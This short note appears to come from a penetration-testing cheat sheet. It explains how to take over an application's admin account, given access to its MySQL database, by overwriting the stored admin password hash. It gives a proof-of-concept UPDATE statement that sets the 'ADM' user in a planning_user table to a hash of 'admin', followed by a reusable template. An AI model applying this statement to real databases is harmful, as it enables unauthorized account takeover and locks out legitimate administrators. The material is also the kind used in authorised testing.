
# Modifying Admin Password

---

Assuming we have access to an MySQL Database, we could try and modify the password of the admin user and change it to our own.

In this case we are using "admin" encoded as password.

## PoC

```
UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
```
```
UPDATE <table> SET password='<encoded_password>' WHERE <user_column> = '<admin_name>';
```